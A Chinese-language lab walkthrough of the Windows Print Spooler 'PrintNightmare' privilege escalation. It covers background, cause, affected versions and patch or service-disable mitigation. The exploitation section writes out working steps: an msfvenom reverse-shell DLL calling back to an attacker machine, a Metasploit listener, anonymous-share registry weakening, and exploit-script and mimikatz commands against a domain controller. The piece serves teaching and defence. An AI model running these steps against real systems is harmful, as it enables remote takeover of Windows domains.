## 漏洞背景

2021年6月9日，微软发布6月份安全补丁更新，修复了50个安全漏洞，其中包括Windows Print Spooler
权限提升漏洞。普通用户可以利用此漏洞以管理员身份在运行打印后台处理程序服务的系统上执行任意代码。如果在域环境中合适的条件下，无需任何用户交互，未经身份验证的远程攻击者就可以利用该漏洞以System权限在域控上执行任意代码，从而获得整个域的控制权。因此，其实在6月份的安全补丁更新中，微软就已经修复了该漏洞，但是该漏洞的exp并没有在网络上公开。

2021年6月29日，深信服科技蓝军首席架构师彭峙酿在GitHub公布了Windows Print
Spooler漏洞利用exp。但该漏洞利用exp针对的漏洞是一个与CVE-2021-1675类似又不完全相同的漏洞，并且当时微软针对该漏洞并没有继续推送安全更新补丁，所以意味着这是一个0day漏洞，这个0day漏洞被称为
PrintNightmare，最新的漏洞编号为CVE-2021-34527.

  * CVE-2021-1675漏洞：已推送安全更新补丁，exp未公开

  * CVE-2021-34527（PrintNightmare）漏洞：7月2日，微软推送该漏洞安全更新补丁，exp已公开

## 漏洞原理

Print Spooler 是在 Windows 系统中用于管理打印相关事务的服务，该服务管理所有本地和网络打印机队列及控制所有打印工作。该服务对应的进程
spoolsv.exe 以 System 权限执行。其设计存在一个严重缺陷，即SeLoadDriverPrivilege
中鉴权存在代码缺陷，参数可以被攻击者控制，因此普通用户可以通过RPC触发RpcAddPrinterDriver绕过安全检测并写入恶意驱动程序。如果域控存在此漏洞，域中普通用户即可通过远程连接域控Print
Spooler服务，向域控中添加恶意驱动，从而控制整个域环境。

Print Spooler的属性如图所示：

![图片.png](https://image.3001.net/images/20230509/1683641488_645a54906933a1ae96269.png!small)

## 漏洞影响版本

Windows Server 2012 R2 (Server Core installation)  
Windows Server 2012 R2  
Windows Server 2012 (Server Core installation)  
Windows Server 2012  
Windows Server 2008 R2 for x64-based Systems Service Pack 1 (Server Core
installation)  
Windows Server 2008 R2 for x64-based Systems Service Pack 1  
Windows Server 2008 for x64-based Systems Service Pack 2 (Server Core
installation)  
Windows Server 2008 for x64-based Systems Service Pack 2  
Windows Server 2008 for 32-bit Systems Service Pack 2 (Server Core
installation)  
Windows Server 2008 for 32-bit Systems Service Pack 2  
Windows RT 8.1  
Windows 8.1 for x64-based systems  
Windows 8.1 for 32-bit systems  
Windows 7 for x64-based Systems Service Pack 1  
Windows 7 for 32-bit Systems Service Pack 1  
Windows Server 2016 (Server Core installation)  
Windows Server 2016  
Windows 10 Version 1607 for x64-based Systems  
Windows 10 Version 1607 for 32-bit Systems  
Windows 10 for x64-based Systems  
Windows 10 for 32-bit Systems  
Windows Server, version 20H2 (Server Core Installation)  
Windows 10 Version 20H2 for ARM64-based Systems  
Windows 10 Version 20H2 for 32-bit Systems  
Windows 10 Version 20H2 for x64-based Systems  
Windows Server, version 2004 (Server Core installation)  
Windows 10 Version 2004 for x64-based Systems  
Windows 10 Version 2004 for ARM64-based Systems  
Windows 10 Version 2004 for 32-bit Systems  
Windows 10 Version 21H1 for 32-bit Systems  
Windows 10 Version 21H1 for ARM64-based Systems  
Windows 10 Version 21H1 for x64-based Systems  
Windows 10 Version 1909 for ARM64-based Systems  
Windows 10 Version 1909 for x64-based Systems  
Windows 10 Version 1909 for 32-bit Systems  
Windows Server 2019 (Server Core installation)  
Windows Server 2019  
Windows 10 Version 1809 for ARM64-based Systems  
Windows 10 Version 1809 for x64-based Systems  
Windows 10 Version 1809 for 32-bit Systems

## 漏洞利用

实验环境如下：

  * 域控 Server 2012 R2：192.168.41.10

  * kali: 192.168.41.16

  * Windows 10 匿名共享主机：192.168.41.15

  * 域内普通有效用户 hack\jack， 密码为Admin123

### 1、检测是否存在漏洞

使用rpcdump.py脚本执行如下的命令检测目标机器是否开启MS-RPRN服务，若开启则可能存在该漏洞

    
    
    python3 rpcdump.py 192.168.41.10 | grep MS-RPRN
    

![图片.png](https://image.3001.net/images/20230509/1683641508_645a54a436033361bee6b.png!small)

### 2、创建匿名SMB共享

探测到目标开启MS-RPRN服务后，就可以开始后续操作了。首先创建一个匿名的SMB共享，在该匿名共享中放入制作的1.dll恶意文件，该文件的功能是上线MSF。

（1）创建匿名共享（Linux）环境

在Linux环境下创建匿名共享需要安装SMB服务，kali默认安装该服务，故下面的案例以Kali为列：

修改SMB配置文件 /etc/samba/smb.conf，修改为如下的内容：

    
    
    [global]
    map to guest = Bad User
    server role = standalone server
    usershare allow guests = yes
    idmap config * : backend = tdb
    smb ports = 445
    [smb]
    comment = Samba
    path = /tmp/
    guest ok = yes
    read only = no
    browseable = yes
    

![图片.png](https://image.3001.net/images/20230509/1683641524_645a54b47606d387c9f30.png!small)

接着我们生成MSF的dll恶意文件

    
    
    msfvenom -p windows/x64/shell_reverse_tcp lhost=192.168.41.16 lport=4444 -f dll -o 1.dll
    

![图片.png](https://image.3001.net/images/20230509/1683641540_645a54c4a2405194644ca.png!small)

然后我们在本地开启监听

    
    
    use exploit/multi/handler
    set payload windows/x64/shell_reverse_tcp
    set lhost 192.168.41.16
    set lport 4444
    run
    

![图片.png](https://image.3001.net/images/20230509/1683641553_645a54d1e97ce29846598.png!small)

接着将1.dll恶意文件放在tmp目录下，然后运行如下命令启动SMB服务。

    
    
    #启动SMB服务
    service smbd start
    #查看SMB服务状态
    service smbd status
    

![图片.png](https://image.3001.net/images/20230509/1683641566_645a54de525164ca47380.png!small)

SMB服务启动后，共享路径为\\\192.168.41.16\smb\1.dll

（2）创建匿名共享（Windows环境）

在Windows环境下创建匿名共享，可在机器192.168.41.15中以管理员权限运行cmd，然后执行如下的命令。该命令会去C盘下创建一个名为Share的文件夹。

    
    
    mkdir C:\share 
    

接着，往刚刚创建的share文件夹下放入1.dll恶意文件，在执行如下的命令。这些命令将上面的share文件夹设置为匿名共享。

    
    
    icacls C:\share\ /T /grant "ANONYMOUS LOGON":r
    icacls C:\share\ /T /grant Everyone:r
    Powershell.exe New-SmbShare -Path C:\share -Name share -ReadAccess 'ANONYMOUS LOGON','Everyone'
    REG ADD "HKLM\System\CurrentControlSet\Services\LanManServer\Parameters" /v NullSessionPipes /t REG_MULTI_SZ /d srvsvc /f
    REG ADD "HKLM\System\CurrentControlSet\Services\LanManServer\Parameters" /v NullSessionShares /t REG_MULTI_SZ /d share /f
    REG ADD "HKLM\System\CurrentControlSet\Control\Lsa" /v EveryoneIncludesAnonymous /t REG_DWORD /d 1 /f 
    REG ADD "HKLM\System\CurrentControlSet\Control\Lsa" /v RestrictAnonymous /t REG_DWORD /d 0 /f
    

![图片.png](https://image.3001.net/images/20230509/1683641583_645a54ef043ac93ca6b04.png!small)

### 3、漏洞利用

创建完匿名共享之后，就可以进行漏洞利用了。下面介绍使用python脚本进行漏洞利用，漏洞利用完成过后会将1.dll恶意文件上传到目标机器的C:\Windows\System32\spool\drivers\x64\3\
目录下并执行。匿名的共享路径是\\\192.168.41.16\smb\1.dll

（1）使用python脚本攻击

脚本下载地址：`https://github.com/cube0x0/CVE-2021-1675`

使用CVE-2021-1675.py脚本执行如下的命令进行漏洞利用，漏洞利用完成后会将1.dll恶意文件上传到目标机器的C:\Windows\System32\spool\drivers\x64\3\目录下并执行

    
    
    python3 CVE-2021-1675.py hack.com/jack:Admin123@192.168.41.10 '\\192.168.41.16\smb\1.dll'
    

![图片.png](https://image.3001.net/images/20230509/1683641599_645a54ff8f578fa34a2a6.png!small)

如图所示，可以看到漏洞利用完成后，即可看到目标域控192.168.41.10上线

![图片.png](https://image.3001.net/images/20230509/1683641614_645a550e637a21a9b4e26.png!small)

(2)使用mimikatz攻击

使用mimikatz执行如下的命令进行漏洞利用，完成后会将1.dll恶意文件上传到目标机器的C:\Windows\System32\spool\drivers\x64\3\
old\2目录下执行。匿名的共享路径是\\\192.168.41.15\share\1.dll

    
    
    mimikatz.exe "misc::printnightmare /server:192.168.41.10 /library:\\192.168.41.15\share\1.dll"
    

![图片.png](https://image.3001.net/images/20230509/1683641632_645a5520af03f6854bb67.png!small)

如图所示，可以看到漏洞利用完成后，即可看到目标域控192.168.41.10上线

![图片.png](https://image.3001.net/images/20230509/1683641646_645a552e8aef7796abb3a.png!small)

## 漏洞预防和修复

对于防守方和蓝方来说，针对PrintNightmare漏洞如何进行预防和修复呢？

1、补丁包升级  
微软已经发布了该漏洞的补丁程序，可以直接通过Windows自动更新解决以上问题。

2、临时防护措施  
若用户暂时无法进行补丁更新，可通过禁用Print Spooler 服务来进行缓解。相关命令如下：

    
    
    #获得Print Spooler 服务的状态
    Get-Service -Name Spooler
    #强制关闭Print Spooler 服务
    Stop-Service -Name Spooler -Force
    #设置Print Spooler 服务为禁用
    Set-Service -Name Spooler -StartupType Disabled
    ﻿

